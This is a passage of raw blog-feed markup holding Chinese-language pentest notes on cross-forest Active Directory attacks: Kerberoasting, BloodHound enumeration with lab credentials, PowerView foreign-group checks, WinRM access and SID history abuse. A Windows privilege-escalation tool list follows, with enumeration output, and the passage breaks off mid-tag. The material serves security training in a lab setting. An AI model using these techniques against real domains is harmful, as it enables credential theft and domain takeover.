Kerberoasting - Linux</h2><h3 id="Impacket-GetUserSPNs-py"><a href="#Impacket-GetUserSPNs-py" class="headerlink" title="Impacket GetUserSPNs.py"></a>Impacket GetUserSPNs.py</h3><p>提取和列出 Active Directory 中用户的服务主体名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -request</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation </span><br><span class="line">-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------</span><br><span class="line">MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  &lt;never&gt;               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>hashcat crack 13100，如果破解成功，能够<code>FREIGHTLOGISTICS.LOCAL</code>以域管理员身份登录域。</p><blockquote><p>假设可以跨信任进行 Kerberoast 攻击，但在当前域中已经没有其他选择。在这种情况下，尝试使用破解的密码进行一次密码喷洒也是值得的，因为如果同一个管理员负责两个域，则有可能将其用于其他服务帐户。</p></blockquote><h2 id="Hunting-Foreign-Group-Membership-BloodHound"><a href="#Hunting-Foreign-Group-Membership-BloodHound" class="headerlink" title="Hunting Foreign Group Membership - BloodHound"></a>Hunting Foreign Group Membership - BloodHound</h2><p>可能不时会看到一个域中的用户或管理员作为另一个域中组的成员。由于只有<code>Domain Local Groups</code>允许来自其林外的用户，因此在处理双向林信任关系时，看到来自域 A 的高权限用户作为域 B 中内置管理员组的成员并不罕见。</p><p>在一些评估中，客户可能会为配置一个虚拟机，该虚拟机从 DHCP 获取 IP，并配置为使用内部域的 DNS。处于一个攻击主机上，而在其他情况下没有配置 DNS。在这种情况下，需要编辑<code>resolv.conf</code>文件来运行此工具，因为它需要目标域控制器的 DNS 主机名，而不是 IP 地址。</p><h3 id="Adding-INLANEFREIGHT-LOCAL-to-etc-resolv-conf"><a href="#Adding-INLANEFREIGHT-LOCAL-to-etc-resolv-conf" class="headerlink" title="Adding INLANEFREIGHT.LOCAL to &#x2F;etc&#x2F;resolv.conf"></a>Adding INLANEFREIGHT.LOCAL to &#x2F;etc&#x2F;resolv.conf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/resolv.conf </span><br><span class="line"></span><br><span class="line"># Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)</span><br><span class="line">#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN</span><br><span class="line"># 127.0.0.53 is the systemd-resolved stub resolver.</span><br><span class="line"># run &quot;resolvectl status&quot; to see details about the actual nameservers.</span><br><span class="line"></span><br><span class="line">#nameserver 1.1.1.1</span><br><span class="line">#nameserver 8.8.8.8</span><br><span class="line">domain INLANEFREIGHT.LOCAL</span><br><span class="line">nameserver 172.16.5.5</span><br></pre></td></tr></table></figure><h3 id="bloodhound-python-Against-INLANEFREIGHT-LOCAL"><a href="#bloodhound-python-Against-INLANEFREIGHT-LOCAL" class="headerlink" title="bloodhound-python Against INLANEFREIGHT.LOCAL"></a>bloodhound-python Against INLANEFREIGHT.LOCAL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2</span><br><span class="line"></span><br><span class="line">INFO: Found AD domain: inlanefreight.local</span><br><span class="line">INFO: Connecting to LDAP server: ACADEMY-EA-DC01</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 2 domains in the forest</span><br><span class="line">INFO: Found 559 computers</span><br><span class="line">INFO: Connecting to LDAP server: ACADEMY-EA-DC01</span><br><span class="line">INFO: Found 2950 users</span><br><span class="line">INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">INFO: Found 183 groups</span><br><span class="line">INFO: Found 2 trusts</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>重复相同的过程，这次填写<code>FREIGHTLOGISTICS.LOCAL</code>域名的详细信息。</p><h3 id="Adding-FREIGHTLOGISTICS-LOCAL-to-etc-resolv-conf"><a href="#Adding-FREIGHTLOGISTICS-LOCAL-to-etc-resolv-conf" class="headerlink" title="Adding FREIGHTLOGISTICS.LOCAL to &#x2F;etc&#x2F;resolv.conf"></a>Adding FREIGHTLOGISTICS.LOCAL to &#x2F;etc&#x2F;resolv.conf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/resolv.conf </span><br><span class="line"></span><br><span class="line"># Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)</span><br><span class="line">#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN</span><br><span class="line"># 127.0.0.53 is the systemd-resolved stub resolver.</span><br><span class="line"># run &quot;resolvectl status&quot; to see details about the actual nameservers.</span><br><span class="line"></span><br><span class="line">#nameserver 1.1.1.1</span><br><span class="line">#nameserver 8.8.8.8</span><br><span class="line">domain FREIGHTLOGISTICS.LOCAL</span><br><span class="line">nameserver 172.16.5.238</span><br></pre></td></tr></table></figure><h3 id="bloodhound-python-Against-FREIGHTLOGISTICS-LOCAL"><a href="#bloodhound-python-Against-FREIGHTLOGISTICS-LOCAL" class="headerlink" title="bloodhound-python Against FREIGHTLOGISTICS.LOCAL"></a>bloodhound-python Against FREIGHTLOGISTICS.LOCAL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2</span><br><span class="line"></span><br><span class="line">INFO: Found AD domain: freightlogistics.local</span><br><span class="line">INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains in the forest</span><br><span class="line">INFO: Found 5 computers</span><br><span class="line">INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL</span><br><span class="line">INFO: Found 9 users</span><br><span class="line">INFO: Connecting to GC LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL</span><br><span class="line">INFO: Found 52 groups</span><br><span class="line">INFO: Found 1 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br></pre></td></tr></table></figure><p>上传第二组数据（每个 JSON 文件或一个 zip 文件）后，可以单击<code>Users with Foreign Domain Group Membership</code>选项卡下的<code>Analysis</code>并选择源域为<code>INLANEFREIGHT.LOCAL</code>。在这里，看到 INLANEFREIGHT.LOCAL 域的内置管理员帐户是之前看到的 FREIGHTLOGISTICS.LOCAL 域中内置管理员组的成员。</p><h3 id="Viewing-Dangerous-Rights-through-BloodHound"><a href="#Viewing-Dangerous-Rights-through-BloodHound" class="headerlink" title="Viewing Dangerous Rights through BloodHound"></a>Viewing Dangerous Rights through BloodHound</h3><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729255916729.png" alt="图像"></p><h2 id="Admin-Password-Re-Use-Group-Membership"><a href="#Admin-Password-Re-Use-Group-Membership" class="headerlink" title="Admin Password Re-Use &amp; Group Membership"></a>Admin Password Re-Use &amp; Group Membership</h2><p>有时，会遇到这样的情况：同一家公司的管理员管理着双向林信任。如果可以接管域 A 并获取内置管理员帐户（或域 A 中的企业管理员或域管理员组的一部分帐户）的明文密码或 NT Hash，而域 B 具有同名的高权限帐户，则值得检查两个林之间的密码重用情况。我偶尔会遇到这样的问题，例如，域 A 有一个名为域管理员<code>adm_bob.smith</code>组中的用户，而域 B 有一个名为的用户<code>bsmith_admin</code>。有时，用户会在两个域中使用相同的密码，而拥有域 A 会立即赋予我对域 B 的完全管理权限。</p><p>还可以将域 A 中的用户或管理员视为域 B 中某个组的成员。仅<code>Domain Local Groups</code>允许来自其林外的安全主体。可能会将域 A 中的域管理员或企业管理员视为双向林信任关系中域 B 中内置管理员组的成员。如果可以接管域 A 中的此管理员用户，根据组成员身份获得对域 B 的完全管理访问权限。</p><h3 id="enum-9"><a href="#enum-9" class="headerlink" title="enum"></a>enum</h3><p>可以使用 PowerView 函数<a href="https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainForeignGroupMember">Get-DomainForeignGroupMember</a>来枚举不属于该域的用户组，也称为<code>foreign group membership</code>。让针对<code>FREIGHTLOGISTICS.LOCAL</code>具有外部双向林信任的域尝试此操作。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainForeignGroupMember</span> <span class="literal">-Domain</span> FREIGHTLOGISTICS.LOCAL</span><br><span class="line"></span><br><span class="line">GroupDomain             : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">GroupName               : Administrators</span><br><span class="line">GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL</span><br><span class="line">MemberDomain            : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">MemberName              : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-500</span></span><br><span class="line">MemberDistinguishedName : CN=S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-500</span>,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS</span><br><span class="line">                          TICS,DC=LOCAL</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Convert-SidToName</span> S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-500</span></span><br><span class="line"></span><br><span class="line">INLANEFREIGHT\administrator</span><br></pre></td></tr></table></figure><p>上述命令输出显示内置管理员组<code>FREIGHTLOGISTICS.LOCAL</code>具有域的内置管理员帐户<code>INLANEFREIGHT.LOCAL</code>作为成员。</p><h3 id="verify"><a href="#verify" class="headerlink" title="verify"></a>verify</h3><p>可以使用<code>Enter-PSSession</code>cmdlet 通过 WinRM 进行连接来验证此访问权限。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-EA-DC03</span>.FREIGHTLOGISTICS.LOCAL <span class="literal">-Credential</span> INLANEFREIGHT\administrator</span><br><span class="line"></span><br><span class="line">[<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC03.FREIGHTLOGISTICS.LOCAL</span>]: <span class="built_in">PS</span> C:\Users\administrator.INLANEFREIGHT\Documents&gt; whoami</span><br><span class="line">inlanefreight\administrator</span><br><span class="line"></span><br><span class="line">[<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC03.FREIGHTLOGISTICS.LOCAL</span>]: <span class="built_in">PS</span> C:\Users\administrator.INLANEFREIGHT\Documents&gt; ipconfig /all</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line">   Host Name . . . . . . . . . . . . : ACADEMY<span class="literal">-EA-DC03</span></span><br><span class="line">   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">   Node <span class="built_in">Type</span> . . . . . . . . . . . . : Hybrid</span><br><span class="line">   IP Routing Enabled. . . . . . . . : No</span><br><span class="line">   WINS Proxy Enabled. . . . . . . . : No</span><br><span class="line">   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL</span><br></pre></td></tr></table></figure><p>从上面的命令输出中，可以看到，已成功<code>FREIGHTLOGISTICS.LOCAL</code>使用域中的管理员帐户<code>INLANEFREIGHT.LOCAL</code>跨双向林信任对域中的域控制器进行了身份验证。在控制域后，这可以快速获得成功，并且如果在评估期间存在双向林信任情况并且第二个林在范围内，则始终值得检查。</p><h2 id="SID-History-Abuse"><a href="#SID-History-Abuse" class="headerlink" title="SID History Abuse"></a>SID History Abuse</h2><p>SID 历史记录也可能被跨林信任滥用。如果用户从一个林迁移到另一个林，并且未启用 SID 筛选，则有可能添加来自另一个林的 SID，并且此 SID 将在跨信任进行身份验证时添加到用户的令牌中。如果将林 A 中具有管理权限的帐户的 SID 添加到林 B 中帐户的 SID 历史记录属性中，假设他们可以跨林进行身份验证，那么此帐户在访问合作伙伴林中的资源时将具有管理权限。</p><p>在下图中，可以看到 <code>jjones</code> 用户从 <code>INLANEFREIGHT.LOCAL</code> 域迁移到另一个林中的 <code>CORP.LOCAL</code> 域的示例。如果在进行迁移时未启用 SID 过滤，并且用户在 <code>INLANEFREIGHT.LOCAL</code> 域中拥有管理权限（或任何类型的相关权利，如 ACE 条目、访问共享等），则他们将在成为新域（第二个林中的 <code>CORP.LOCAL</code>）的成员时保留其在 <code>INLANEFREIGHT.LOCAL</code> 中的管理权限&#x2F;访问权限。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729256427161.png" alt="图像"></p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lateral-Movement </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows Privilege Escalation</title>
      <link href="/2024/10/30/pentest/privesc/Windows%20Privilege%20Escalation/"/>
      <url>/2024/10/30/pentest/privesc/Windows%20Privilege%20Escalation/</url>
      
        <content type="html"><![CDATA[<p>Windows 权限提升的总体目标是进一步将系统的访问权限提升到 <code>Local Administrators</code> 组或 <code>NT AUTHORITY\SYSTEM</code> <a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account">LocalSystem</a> 账户。</p><p><strong>Privilege Escalation Ways</strong></p><table><thead><tr><th>Privilege</th><th>Escalation</th></tr></thead><tbody><tr><td>Abusing Windows group privileges</td><td>滥用 Windows 组权限</td></tr><tr><td>Abusing Windows user privileges</td><td>滥用 Windows 用户权限</td></tr><tr><td>Bypassing User Account Control</td><td>绕过用户账户控制</td></tr><tr><td>Abusing weak service&#x2F;file permissions</td><td>滥用弱服务&#x2F;文件权限</td></tr><tr><td>Leveraging unpatched kernel exploits</td><td>利用未修补的内核漏洞</td></tr><tr><td>Credential theft</td><td>凭证盗窃</td></tr><tr><td>Traffic Capture</td><td>流量捕获</td></tr><tr><td>and more.</td><td>…</td></tr></tbody></table><p><strong>Tools</strong></p><table><thead><tr><th>Tools</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a></td><td>用于执行各种本地特权升级检查的 C# 项目</td></tr><tr><td><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winPEAS</a></td><td>WinPEAS 是一个脚本，用于搜索在 Windows 主机上提升权限的可能路径。所有检查均<a href="https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation">在此处说明</a></td></tr><tr><td><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">PowerUp.ps1</a></td><td>PowerShell 脚本用于查找依赖于错误配置的常见 Windows 特权提升向量。它还可用于利用发现的一些问题</td></tr><tr><td><a href="https://github.com/GhostPack/SharpUp">SharpUp</a></td><td>C# 版本的 PowerUp</td></tr><tr><td><a href="https://github.com/411Hall/JAWS">JAWS</a></td><td>使用 PowerShell 2.0 编写的用于枚举特权升级向量的 PowerShell 脚本</td></tr><tr><td><a href="https://github.com/Arvanaghi/SessionGopher">SessionGopher</a></td><td>SessionGopher 是一个 PowerShell 工具，用于查找和解密远程访问工具的已保存会话信息。它提取 PuTTY、WinSCP、SuperPuTTY、FileZilla 和 RDP 已保存的会话信息</td></tr><tr><td><a href="https://github.com/rasta-mouse/Watson">Watson</a></td><td>Watson 是一个 .NET 工具，旨在枚举缺失的 KB 并建议利用权限提升漏洞。</td></tr><tr><td><a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></td><td>用于从 Web 浏览器、聊天工具、数据库、Git、电子邮件、内存转储、PHP、系统管理工具、无线网络配置、内部 Windows 密码存储机制等检索存储在本地机器上的密码的工具</td></tr><tr><td><a href="https://github.com/bitsadmin/wesng">Windows Exploit Suggester - Next Generation</a></td><td>WES-NG 是一款基于 Windows<code>systeminfo</code>实用程序输出的工具，它提供了操作系统易受攻击的漏洞列表，包括针对这些漏洞的任何攻击。Windows XP 和 Windows 10 之间的所有 Windows 操作系统（包括其 Windows Server 对应版本）均受支持</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">sysinternals-suite</a></td><td>将在枚举中使用 Sysinternals 的几种工具，包括<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk</a>、<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist">PipeList</a>和<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice">PsService</a></td></tr></tbody></table><p>已编译好的项目 <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a></p><h1 id="Situational-Awareness"><a href="#Situational-Awareness" class="headerlink" title="Situational Awareness"></a>Situational Awareness</h1><h2 id="Network-Information"><a href="#Network-Information" class="headerlink" title="Network Information"></a>Network Information</h2><h3 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">ipconfig</span> /<span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">...<span class="title">SNPI</span>...</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Ethernet</span> <span class="title">adapter</span> <span class="title">Ethernet1</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">   <span class="title">Connection</span>-<span class="title">specific</span> <span class="title">DNS</span> <span class="title">Suffix</span>  . :</span></span><br><span class="line"><span class="function">   <span class="title">Description</span> . . . . . . . . . . . : <span class="title">vmxnet3</span> <span class="title">Ethernet</span> <span class="title">Adapter</span></span></span><br><span class="line"><span class="function">   <span class="title">Physical</span> <span class="title">Address</span>. . . . . . . . . : 00-50-56-<span class="title">B9</span>-<span class="title">C5</span>-4<span class="title">B</span></span></span><br><span class="line"><span class="function">   <span class="title">DHCP</span> <span class="title">Enabled</span>. . . . . . . . . . . : <span class="title">No</span></span></span><br><span class="line"><span class="function">   <span class="title">Autoconfiguration</span> <span class="title">Enabled</span> . . . . : <span class="title">Yes</span></span></span><br><span class="line"><span class="function">   <span class="title">Link</span>-<span class="title">local</span> <span class="title">IPv6</span> <span class="title">Address</span> . . . . . : <span class="title">fe80</span>::<span class="title">f055:fefd</span>:<span class="title">b1b</span>:9919%9(<span class="title">Preferred</span>)</span></span><br><span class="line"><span class="function">   <span class="title">IPv4</span> <span class="title">Address</span>. . . . . . . . . . . : 192.168.20.56(<span class="title">Preferred</span>)</span></span><br><span class="line"><span class="function">   <span class="title">Subnet</span> <span class="title">Mask</span> . . . . . . . . . . . : 255.255.255.0</span></span><br><span class="line"><span class="function">   <span class="title">Default</span> <span class="title">Gateway</span> . . . . . . . . . : 192.168.20.1</span></span><br><span class="line"><span class="function">   <span class="title">DHCPv6</span> <span class="title">IAID</span> . . . . . . . . . . . : 151015510</span></span><br><span class="line"><span class="function">   <span class="title">DHCPv6</span> <span class="title">Client</span> <span class="title">DUID</span>. . . . . . . . : 00-01-00-01-27-<span class="title">ED</span>-<span class="title">DB</span>-68-00-50-56-<span class="title">B9</span>-90-94</span></span><br><span class="line"><span class="function">   <span class="title">DNS</span> <span class="title">Servers</span> . . . . . . . . . . . : 8.8.8.8</span></span><br><span class="line"><span class="function">   <span class="title">NetBIOS</span> <span class="title">over</span> <span class="title">Tcpip</span>. . . . . . . . : <span class="title">Enabled</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Ethernet</span> <span class="title">adapter</span> <span class="title">Ethernet0</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">   <span class="title">Connection</span>-<span class="title">specific</span> <span class="title">DNS</span> <span class="title">Suffix</span>  . : .\</span></span><br><span class="line"><span class="function">   <span class="title">Description</span> . . . . . . . . . . . : <span class="title">Intel</span>(<span class="title">R</span>) 82574<span class="title">L</span> <span class="title">Gigabit</span> <span class="title">Network</span> <span class="title">Connection</span></span></span><br><span class="line"><span class="function">   <span class="title">Physical</span> <span class="title">Address</span>. . . . . . . . . : 00-50-56-<span class="title">B9</span>-90-94</span></span><br><span class="line"><span class="function">   <span class="title">DHCP</span> <span class="title">Enabled</span>. . . . . . . . . . . : <span class="title">Yes</span></span></span><br><span class="line"><span class="function">   <span class="title">Autoconfiguration</span> <span class="title">Enabled</span> . . . . : <span class="title">Yes</span></span></span><br><span class="line"><span class="function">   <span class="title">IPv6</span> <span class="title">Address</span>. . . . . . . . . . . : <span class="title">dead:beef</span>::<span class="title">e4db</span>:5<span class="title">ea3</span>:2775:8<span class="title">d4d</span>(<span class="title">Preferred</span>)</span></span><br><span class="line"><span class="function">   <span class="title">Link</span>-<span class="title">local</span> <span class="title">IPv6</span> <span class="title">Address</span> . . . . . : <span class="title">fe80</span>::<span class="title">e4db</span>:5<span class="title">ea3</span>:2775:8<span class="title">d4d</span>%4(<span class="title">Preferred</span>)</span></span><br><span class="line"><span class="function">   <span class="title">IPv4</span> <span class="title">Address</span>. . . . . . . . . . . : 10.129.43.8(<span class="title">Preferred</span>)</span></span><br><span class="line"><span class="function">   <span class="title">Subnet</span> <span class="title">Mask</span> . . . . . . . . . . . : 255.255.0.0</span></span><br><span class="line"><span class="function">   <span class="title">Lease</span> <span class="title">Obtained</span>. . . . . . . . . . : <span class="title">Thursday</span>, <span class="title">March</span> 25, 2021 9:24:45 <span class="title">AM</span></span></span><br><span class="line"><span class="function">   <span class="title">Lease</span> <span class="title">Expires</span> . . . . . . . . . . : <span class="title">Monday</span>, <span class="title">March</span> 29, 2021 1:28:44 <span class="title">PM</span></span></span><br><span class="line"><span class="function">   <span class="title">Default</span> <span class="title">Gateway</span> . . . . . . . . . : <span class="title">fe80</span>::250:56<span class="title">ff:feb9</span>:4<span class="title">ddf</span>%4</span></span><br><span class="line"><span class="function">                                       10.129.0.1</span></span><br><span class="line"><span class="function">   <span class="title">DHCP</span> <span class="title">Server</span> . . . . . . . . . . . : 10.129.0.1</span></span><br><span class="line"><span class="function">   <span class="title">DHCPv6</span> <span class="title">IAID</span> . . . . . . . . . . . : 50352214</span></span><br><span class="line"><span class="function">   <span class="title">DHCPv6</span> <span class="title">Client</span> <span class="title">DUID</span>. . . . . . . . : 00-01-00-01-27-<span class="title">ED</span>-<span class="title">DB</span>-68-00-50-56-<span class="title">B9</span>-90-94</span></span><br><span class="line"><span class="function">   <span class="title">DNS</span> <span class="title">Servers</span> . . . . . . . . . . . : 1.1.1.1</span></span><br><span class="line"><span class="function">                                       8.8.8.8</span></span><br><span class="line"><span class="function">   <span class="title">NetBIOS</span> <span class="title">over</span> <span class="title">Tcpip</span>. . . . . . . . : <span class="title">Enabled</span></span></span><br><span class="line"><span class="function">   </span></span><br><span class="line"><span class="function">...<span class="title">SNPI</span>...</span></span><br></pre></td></tr></table></figure><h3 id="arp"><a href="#arp" class="headerlink" title="arp"></a>arp</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">arp</span> -<span class="title">a</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Interface</span>: 10.129.43.8 --- 0<span class="title">x4</span></span></span><br><span class="line"><span class="function">  <span class="title">Internet</span> <span class="title">Address</span>      <span class="title">Physical</span> <span class="title">Address</span>      <span class="title">Type</span></span></span><br><span class="line"><span class="function">  10.129.0.1            00-50-56-<span class="title">b9</span>-4<span class="title">d</span>-<span class="title">df</span>     <span class="title">dynamic</span></span></span><br><span class="line"><span class="function">  10.129.43.12          00-50-56-<span class="title">b9</span>-<span class="title">da</span>-<span class="title">ad</span>     <span class="title">dynamic</span></span></span><br><span class="line"><span class="function">  10.129.43.13          00-50-56-<span class="title">b9</span>-5<span class="title">b</span>-9<span class="title">f</span>     <span class="title">dynamic</span></span></span><br><span class="line"><span class="function">  10.129.255.255        <span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>     <span class="title">static</span></span></span><br><span class="line"><span class="function">  224.0.0.22            01-00-5<span class="title">e</span>-00-00-16     <span class="title">static</span></span></span><br><span class="line"><span class="function">  224.0.0.252           01-00-5<span class="title">e</span>-00-00-<span class="title">fc</span>     <span class="title">static</span></span></span><br><span class="line"><span class="function">  224.0.0.253           01-00-5<span class="title">e</span>-00-00-<span class="title">fd</span>     <span class="title">static</span></span></span><br><span class="line"><span class="function">  239.255.255.250       01-00-5<span class="title">e</span>-7<span class="title">f</span>-<span class="title">ff</span>-<span class="title">fa</span>     <span class="title">static</span></span></span><br><span class="line"><span class="function">  255.255.255.255       <span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>     <span class="title">static</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Interface</span>: 192.168.20.56 --- 0<span class="title">x9</span></span></span><br><span class="line"><span class="function">  <span class="title">Internet</span> <span class="title">Address</span>      <span class="title">Physical</span> <span class="title">Address</span>      <span class="title">Type</span></span></span><br><span class="line"><span class="function">  192.168.20.255        <span class="title">ff</span>-<span 